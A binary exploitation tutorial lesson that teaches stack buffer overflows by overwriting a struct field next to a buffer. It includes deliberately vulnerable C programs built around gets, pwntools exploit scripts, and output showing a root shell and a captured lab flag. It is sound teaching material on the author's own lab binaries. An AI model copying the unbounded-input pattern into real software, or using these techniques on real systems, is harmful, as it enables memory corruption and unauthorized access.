---
title: "Lesson 3.1: Overwriting a Local Variable to Bypass a Check"
image:
  path: /assets/img/covers/pwn-3-1-overwriting-local-variable-bypass-check.webp
  alt: "Overwriting a Local Variable to Bypass a Check"
date: 2022-11-06 02:09:00 +0700
categories: ["Binary Exploitation", "Pwn · Buffer Overflow"]
tags: [pwn, buffer-overflow, stack, local-variables]
render_with_liquid: false
---

This is the first overflow lesson, and the place where many people first see a program do the exact opposite of what its author intended, just because the input was longer than the box it was meant to fit in. By the end you understand why overflowing a buffer can overwrite a variable sitting next to it, and you build a password check program by hand that "unlocks" even though you never know the password.

![Stack layout of a buffer overflowing into an adjacent authed flag](/assets/img/pwn/pwn-3-1-overwriting-local-variable-bypass-check.svg)
_Writing past `buf` walks upward in memory and lands on `authed`, which sits right after it in the struct._

**Part:** 3 · **Reading + lab time:** ~45 minutes · **Difficulty:** easy

**Prerequisites:** Lesson 1.2 (stack frames, local variables live on the stack), Lesson 1.4 (dangerous functions like `gets`), Lesson 2.1 (pwntools), Lesson 2.2 (gdb).

**Tools:** gcc, gdb + pwndbg, pwntools.

## Goals

By the end of this lesson you understand buffer overflow at the mechanical level (writing past capacity, the extra bytes spilling into the next slot), you can explain why a local variable gets overwritten when an adjacent buffer overflows, you can write an arbitrary value (and a specific value) into a local variable to flip an `if` branch, and you know that the compiler is free to reorder local variables, so you have to check the real layout instead of trusting declaration order.

## Theory

### Buffer overflow, stated precisely

Buffer overflow: writing more data into a region of memory than it can hold, with the extra spilling into whatever comes right after it. C has no automatic bounds checking. `char buf[32]` is just 32 contiguous bytes. If you call `gets(buf)` and the user types 40 characters, the last 8 bytes land outside `buf`, overwriting whatever sits next in memory.

A local variable lives on the stack. When a function runs, it allocates a region called a stack frame to hold its local variables. If `buf` and a variable `authed` both live in that frame and `authed` sits right after `buf`, then overflowing `buf` toward higher addresses tramples `authed`.

### Which direction the overflow goes

The stack grows from high addresses to low addresses, but writing into a buffer runs from low to high (index 0, 1, 2...). So when you write past `buf`, you write toward higher addresses. Whichever variable sits at a higher address than `buf` gets hit. This detail decides everything: if the target variable sits at a lower address than `buf`, overflowing `buf` never touches it.

### A trap right from the start: the compiler reorders things

Newcomers often assume that declaring

```c
char buf[32];
int authed = 0;
```

places `authed` right after `buf`. In reality the compiler is free to arrange local variables however it wants, for alignment, for optimization. Testing this on gcc 13.3, Ubuntu 24.04, shows `authed` sitting 4 bytes *below* `buf`:

```
buf     = 0x7fffffffea70
&authed = 0x7fffffffea6c    (lower than buf, overflowing buf never reaches it)
```

That means overflowing `buf` upward will never overwrite `authed`. The lesson is to never trust declaration order and to check the real layout with gdb.

For a demo that is reliable and easy to follow, we use a trick: put both variables inside a `struct`. Struct members are required by the C standard to keep declaration order and sit contiguously, so `buf` is guaranteed to be at the lower address and the check variable guaranteed to sit right after it. This also matches real code, plenty of programs bundle a buffer and a status flag into one struct.

### What this technique needs

- A function that reads input with no length limit (`gets`, `strcpy`, `scanf("%s")`, `read` with a count bigger than the buffer) writing into the buffer.
- A flow-deciding variable (an authentication flag, a comparison variable) sitting at a higher address than the buffer, within reach of the overflow.
- No special mitigation needs disabling for this lesson, since we are not touching the saved RIP yet, so the canary never comes into play. But to keep the layout predictable, we still compile with No PIE and no stack protector.

## Demo

Test environment: Ubuntu 24.04, glibc 2.39, gcc 13.3. Every output below is real, run on this machine. Source, build script, exploit, and full transcript are in the Lab section below.

### Sample binary: an auth flag

```c
// login.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win(void) {
    puts("[+] authed != 0, unlocked!");
    system("/bin/sh");
}

int main(void) {
    // Put both fields in a struct so the layout keeps declaration order:
    // buf at the lower address, authed right after it (higher address).
    struct {
        char buf[32];
        int  authed;
    } s;

    s.authed = 0;
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Login: ");
    gets(s.buf);                 // vulnerable: no length limit

    if (s.authed != 0) {
        win();
    } else {
        printf("authed is currently %d. Denied.\n", s.authed);
    }
    return 0;
}
```

Compile:

```bash
gcc -fno-stack-protector -no-pie -O0 -o login login.c
```

### Checking the layout with gdb before exploiting

Do not guess the offset, measure it. Set a breakpoint and look at the addresses of `s.buf` and `s.authed`:

```gdb
pwndbg> break login.c:22
pwndbg> run
pwndbg> p &s.buf
$1 = (char (*)[32]) 0x7fffffffe9f0
pwndbg> p &s.authed
$2 = (int *) 0x7fffffffea10        # 0x20 = 32 bytes above buf
```

`authed` sits exactly 32 bytes past the start of `buf`. So 32 characters fill `buf` exactly, and the 33rd character onward starts overwriting `authed`.

### Testing by hand first

```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*32)" | ./login
Login: authed is currently 0. Denied.      # just filled buf, didn't touch authed

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*36)" | ./login
Login: [+] authed != 0, unlocked!   # 4 bytes of 'A' overflowed into authed
```

32 bytes is not enough. 36 bytes writes 4 `A` characters into `authed`, turning it into `0x41414141`, nonzero, so the `win()` branch runs.

### pwntools script that gets a shell

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./login')
io = process('./login')

payload = b'A' * 32 + b'B' * 4          # 32 padding + 4 arbitrary (nonzero) bytes for authed
io.sendlineafter(b'Login: ', payload)
io.interactive()
```

Run (real output, the test machine runs as root so uid=0):

```
[+] authed != 0, unlocked!
$ id
uid=0(root) gid=0(root) groups=0(root)
```

A non-interactive version of the script, convenient for capturing a transcript, is `exp_login.py` in the Lab section below: after the overflow it waits for the banner then sends `echo ===SHELL_OK===; id; exit` and prints `===SHELL_OK===` plus a `uid=0(root)...` line.

### Variant: writing a specific value (learning endianness)

Many programs do not compare against "nonzero" but against a fixed value, for example `if (key == 0xdeadbeef)`. Now you cannot write garbage, you have to write exactly those 4 bytes. This is where pwntools' `p32` earns its place:

```c
// magic.c: compare key against a fixed value
struct { char buf[32]; unsigned int key; } s;
...
if (s.key == 0xdeadbeef) win();
```

```python
payload = b'A' * 32 + p32(0xdeadbeef)   # p32 handles byte order (little-endian)
io.sendlineafter(b'key? ', payload)
```

Writing `b'\xde\xad\xbe\xef'` by hand is the wrong order (x86-64 is little-endian). `p32(0xdeadbeef)` produces `b'\xef\xbe\xad\xde'`, the order the machine actually reads. Always let `p32`/`p64` handle this.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 3.1</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/3.1.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/3.1/admin.c" download><i class="fa-solid fa-file-code"></i>admin.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.1/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/3.1/exp_login.py" download><i class="fa-solid fa-file-code"></i>exp_login.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.1/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.1/login.c" download><i class="fa-solid fa-file-code"></i>login.c</a>
</div>
</div>

Task: compile the `admin` binary below and get it to print the flag. The program compares a variable `role` against a specific value.

```c
// admin.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void print_flag(void){
    char f[64]; int fd = open("flag.txt", O_RDONLY);
    if (fd < 0){ puts("missing flag.txt"); _exit(1); }
    int n = read(fd, f, 64); write(1, "Flag: ", 6); write(1, f, n); _exit(0);
}

int main(void){
    struct { char name[48]; unsigned int role; } u;
    u.role = 0;
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Name: ");
    gets(u.name);
    if (u.role == 0x80000001) print_flag();     // role = admin
    else printf("role=0x%x, you're just a user.\n", u.role);
    return 0;
}
```

Build command and a fake flag for local testing:

```bash
gcc -fno-stack-protector -no-pie -O0 -o admin admin.c
echo 'FLAG{you_overwrote_a_local_variable}' > flag.txt
```

Reference script (write your own first, then compare):

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./admin')
io = process('./admin')
io.sendlineafter(b'Name: ', b'A'*48 + p32(0x80000001))
print(io.recvall(timeout=2).decode())
```

Hints, in tiers:

- Hint 1: `role` sits right after `name[48]` in the struct, so the offset is 48. Confirm with gdb using `p &u.name` and `p &u.role` if you want to be sure.
- Hint 2: the value you need to write is `0x80000001`, 4 bytes wide, use `p32`. Do not use `p64`, it would write too much.
- Hint 3: `gets` reads until a newline, so use `sendlineafter`. But watch out, if your payload happens to contain byte `0x0a` (newline), `gets` stops early. `0x80000001` has no `0x0a` byte, so it is safe.

Real result (running `python3 exploit.py` in the lab directory, Ubuntu 24.04, glibc 2.39, gcc 13.3):

```
Flag: FLAG{you_overwrote_a_local_variable}
```

Checking by hand: `A*48` gives `role=0x0, you're just a user.`, while `A*48 + p32(0x80000001)` gives the `Flag:` line above. Full transcript in `transcript.txt` from the Lab section below.

Check yourself: can you explain why the payload is 52 bytes long, and why the last 4 bytes cannot be typed in reading order by hand?

## Key takeaways

- Overflow means writing past capacity, the extra spills into the next region (toward higher addresses).
- The target variable has to sit at a higher address than the buffer to be hit.
- The compiler is free to reorder local variables; check the real layout with gdb, do not trust declaration order.
- Writing "nonzero" only needs an arbitrary byte; writing a specific value needs `p32`/`p64` at the right width.
- `gets`/`scanf("%s")` stop at newline, watch for byte `0x0a` in the payload.

## Common pitfalls

- Overflow that does not change the variable: almost certainly the target variable sits at a lower address than the buffer (the compiler reordered things). Check with gdb, or force the order with a struct as in the demo.
- Payload truncated by a null or newline byte: `gets` stops at `\n`, `scanf("%s")` stops at whitespace, `strcpy` stops at `\x00`. If the value you need contains those bytes, the input function will cut your payload short. Pick a different read function or a different value.
- Using `p64` for a 4-byte `int` variable: overwrites 4 extra bytes into the next region, possibly corrupting another variable or crashing before you can even check.
- Miscounting the offset from the declared size: there is always alignment padding. With a struct the offset equals the field position (you can use `offsetof`); with separate variables you must measure with gdb.
- Local works, remote fails: rare for this lesson since no address is involved, but if the server reads input differently (a `\n` in a different place) you need to adjust.

## Further reading

- CWE-787 Out-of-bounds Write and CWE-121 Stack-based Buffer Overflow (mitre.org).
- "Smashing The Stack For Fun And Profit" (Aleph One), the opening section, to see the historical roots.
- The next lesson goes one step further: instead of overwriting a variable, we overwrite the saved RIP directly.
